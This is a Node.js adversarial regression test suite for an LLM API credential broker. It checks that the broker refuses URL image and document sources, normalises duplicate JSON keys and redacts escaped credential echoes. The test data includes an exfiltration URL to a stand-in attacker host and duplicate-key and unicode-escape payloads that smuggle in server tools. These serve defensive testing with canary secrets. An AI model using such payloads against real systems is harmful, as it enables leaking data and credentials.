// node --test docker/llm-broker/broker.adversarial.test.mjs
// ADVERSARIAL review tests (independent reviewer, 2026-10-17) for the credential broker.
// Synthetic canary credentials only; LOCAL mock upstream only (nothing reaches Anthropic).
//
// These tests originally documented GAPS (asserting the insecure behaviour). The gaps were fixed in
// the repair pass (2026-10-17) and every assertion is now FLIPPED to the secure behaviour, so each
// test is a regression test for one adversarial finding:
//   F1 URL image/document sources (any depth) -> 403, upstream not contacted
//   F2 duplicate-key parser differential -> upstream receives the re-serialized inspected object
//   F3 JSON-escaped credential echo -> redacted
import { matchSecretAt, containsSecret, RedactStream } from './broker.mjs';
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { createBroker, serverSideEgressReason } from './broker.mjs';

const REAL = 'sk-ant-oat01-KWCANARY-adversarial-0123456789abcdef';
const CLIENT = 'sk-ant-oat01-kwbroker-adversarial-placeholder-01';
let upstream, broker, brUrl;
let seen = [];
let mode = 'ok';

before(async () => {
  upstream = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      seen.push({ url: req.url, body });
      if (mode === 'reflect-escaped') {
        // Upstream echoes the credential JSON-unicode-escaped (first char as s): valid JSON, same secret.
        const tok = req.headers.authorization.replace(/^Bearer /, '');
        const esc = '\\u' + tok.charCodeAt(0).toString(16).padStart(4, '0') + tok.slice(1);
        res.writeHead(200, { 'content-type': 'application/json', 'x-echo-auth': `Bearer ${esc}` });
        res.end(`{"echo":"${esc}"}`);
        return;
      }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end('{"ok":true}');
    });
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  broker = createBroker({ realToken: REAL, clientToken: CLIENT, upstream: `http://127.0.0.1:${upstream.address().port}`, allowInsecureUpstream: true, log: () => {} });
  await new Promise((r) => broker.listen(0, '127.0.0.1', r));
  brUrl = `http://127.0.0.1:${broker.address().port}`;
});
after(() => { broker.close(); upstream.close(); });

const post = (body) =>
  new Promise((resolve, reject) => {
    const r = http.request(`${brUrl}/v1/messages`, { method: 'POST', headers: { authorization: `Bearer ${CLIENT}`, 'content-type': 'application/json' } }, (res) => {
      let b = '';
      res.on('data', (c) => { b += c; });
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: b }));
    });
    r.on('error', reject);
    r.end(typeof body === 'string' ? body : JSON.stringify(body));
  });

const EXFIL = 'https://attacker.invalid/collect?d=KWCANARY-workspace-data';
const M = 'claude-haiku-4-5';
const refused = async (body, label) => {
  seen = []; mode = 'ok';
  const r = await post(body);
  assert.equal(r.status, 403, label);
  assert.match(r.body, /url_source/, label);
  assert.equal(seen.length, 0, `${label}: upstream must not be contacted`);
};

test('F1: image content block with a URL source is refused (403) and never reaches upstream', async () => {
  const body = { model: M, max_tokens: 1, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: EXFIL } }, { type: 'text', text: 'hi' }] }] };
  assert.equal(serverSideEgressReason(body), 'url_source');
  await refused(body, 'image url');
});

test('F1: document (PDF) content block with a URL source is refused', async () => {
  const body = { model: M, max_tokens: 1, messages: [{ role: 'user', content: [{ type: 'document', source: { type: 'url', url: EXFIL + '.pdf' } }] }] };
  assert.equal(serverSideEgressReason(body), 'url_source');
  await refused(body, 'document url');
});

test('F1: URL image nested inside a tool_result is refused', async () => {
  await refused({
    model: M, max_tokens: 1,
    messages: [
      { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'Bash', input: { command: 'ls' } }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: [{ type: 'image', source: { type: 'url', url: EXFIL } }] }] },
    ],
  }, 'tool_result image url');
});

test('F1: URL sources in system, deeply nested, case/space variants, and source objects carrying a url are refused', async () => {
  let deep = { type: 'image', source: { type: 'url', url: EXFIL } };
  for (let i = 0; i < 5000; i++) deep = { type: 'tool_result', tool_use_id: 't', content: [deep] };
  const cases = [
    { system: [{ type: 'text', text: 's' }, { type: 'image', source: { type: 'url', url: EXFIL } }], messages: [{ role: 'user', content: 'hi' }] },
    { messages: [{ role: 'user', content: [deep] }] },
    { messages: [{ role: 'user', content: [{ type: 'image', source: { type: ' URL ', url: EXFIL } }] }] },
    { messages: [{ role: 'user', content: [{ type: 'document', source: { type: 'base64', url: EXFIL, media_type: 'application/pdf', data: 'eA==' } }] }] },
    { messages: [{ role: 'user', content: [{ type: 'document', source: { type: 'content', content: [{ type: 'image', source: { type: 'url', url: EXFIL } }] } }] }] },
  ];
  for (const [i, c] of cases.entries()) await refused({ model: M, max_tokens: 1, ...c }, `case ${i}`);
});

test('F1 (no false positive): base64 images, search_result string sources, URL-ish tool_use inputs and schemas still pass', async () => {
  seen = []; mode = 'ok';
  const body = {
    model: M, max_tokens: 1,
    tools: [{ name: 'Fetchish', input_schema: { type: 'object', properties: { source: { type: 'object', properties: { type: { type: 'string', enum: ['url'] }, url: { type: 'string' } } } } } }],
    messages: [
      { role: 'user', content: [{ type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'iVBORw0KGgo=' } }, { type: 'text', text: 'see https://example.com and {"type":"url"}' }] },
      { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'Fetchish', input: { source: { type: 'url', url: 'https://example.com' } } }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: [{ type: 'search_result', source: 'https://example.com', title: 't', content: [{ type: 'text', text: 'x' }] }] }] },
    ],
  };
  assert.equal(serverSideEgressReason(body), null);
  const r = await post(body);
  assert.equal(r.status, 200);
  assert.equal(seen.length, 1);
  assert.deepEqual(JSON.parse(seen[0].body), body);
});

test('F2: duplicate "tools" key - upstream receives exactly the inspected (last-wins) object, never the hidden web_search', async () => {
  seen = []; mode = 'ok';
  const raw = '{"model":"claude-haiku-4-5","max_tokens":1,"tools":[{"type":"web_search_20250305","name":"web_search"}],"tools":[],"messages":[{"role":"user","content":"hi"}]}';
  const r = await post(raw);
  assert.equal(r.status, 200);
  assert.equal(seen.length, 1);
  assert.ok(!seen[0].body.includes('web_search'), 'hidden server tool must not reach upstream');
  assert.deepEqual(JSON.parse(seen[0].body).tools, []);
  // and the reverse order (server tool last) is refused outright
  seen = [];
  const r2 = await post('{"model":"m","tools":[],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}],"messages":[]}');
  assert.equal(r2.status, 403);
  assert.equal(seen.length, 0);
});

test('F2: duplicate keys hiding a URL source and escaped key names are normalised before forwarding', async () => {
  seen = []; mode = 'ok';
  // "type" is "type": the broker decodes it like any JSON parser and refuses the URL source.
  const r = await post(`{"model":"m","messages":[{"role":"user","content":[{"type":"image","source":{"\\u0074ype":"url","url":"${EXFIL}"}}]}]}`);
  assert.equal(r.status, 403);
  // duplicate "source": broker keeps the last (base64) and forwards ONLY that
  const r2 = await post(`{"model":"m","messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"${EXFIL}"},"source":{"type":"base64","media_type":"image/png","data":"eA=="}}]}]}`);
  assert.equal(r2.status, 200);
  assert.equal(seen.length, 1);
  assert.ok(!seen[0].body.includes('attacker.invalid'));
});

test('F3: a JSON-escaped echo of the credential is redacted', async () => {
  seen = []; mode = 'reflect-escaped';
  const r = await post({ model: M, max_tokens: 1, messages: [{ role: 'user', content: 'hi' }] });
  assert.equal(r.status, 200);
  assert.ok(!r.body.includes(REAL));
  const echo = JSON.parse(r.body).echo;
  assert.notEqual(echo, REAL);
  assert.ok(!echo.includes('KWCANARY'));
  assert.match(r.body, /\[REDACTED:kw-broker\]/);
  mode = 'ok';
});

test('F3: every JSON spelling (fully escaped, mixed hex case) is redacted, also when split byte-by-byte across chunks', async () => {
  const S = 'sk-KWCANARY-split-01';
  const esc = (c, upper) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')[upper ? 'toUpperCase' : 'toLowerCase']();
  const full = [...S].map((c) => esc(c, false)).join('');
  const mixed = [...S].map((c, i) => (i % 3 === 0 ? esc(c, i % 2 === 0) : c)).join('');
  const input = `data: {"a":"${full}","b":"${mixed}","c":"${S}","d":"\\n\\u0041 ok"}\n\n`;
  for (const chunked of [false, true]) {
    const s = new RedactStream(S);
    const out = [];
    s.on('data', (c) => out.push(c));
    if (chunked) for (const ch of input) s.write(ch); else s.write(input);
    s.end();
    await new Promise((res) => s.on('end', res));
    const text = Buffer.concat(out).toString();
    const decoded = JSON.parse(text.slice(6).trim());
    assert.equal(s.hits, 3, `chunked=${chunked}`);
    for (const k of ['a', 'b', 'c']) assert.equal(decoded[k], '[REDACTED:kw-broker]');
    assert.equal(decoded.d, '\nA ok', 'unrelated escapes untouched');
  }
  assert.equal(matchSecretAt(Buffer.from('\\u00'), 0, Buffer.from(S)), 0, 'partial escape is held back');
  assert.equal(matchSecretAt(Buffer.from('\\n'), 0, Buffer.from(S)), -1);
  assert.ok(containsSecret(Buffer.from(`x ${full} y`), Buffer.from(S)));
  assert.ok(!containsSecret(Buffer.from('sk-KWCANARY-split-0'), Buffer.from(S)));
});

test('F3: response header carrying an escaped credential is dropped', async () => {
  seen = []; mode = 'reflect-escaped';
  const r = await post({ model: M, max_tokens: 1, messages: [{ role: 'user', content: 'hi' }] });
  assert.equal(r.status, 200);
  assert.equal(r.headers['x-echo-auth'], undefined);
  assert.ok(!JSON.stringify(r.headers).includes('KWCANARY'));
  mode = 'ok';
});

test('CONTROL: real server tools are still refused (403) and the upstream is not contacted', async () => {
  seen = []; mode = 'ok';
  const r = await post({ model: M, max_tokens: 1, tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }], messages: [{ role: 'user', content: 'hi' }] });
  assert.equal(r.status, 403);
  assert.equal(seen.length, 0);
});
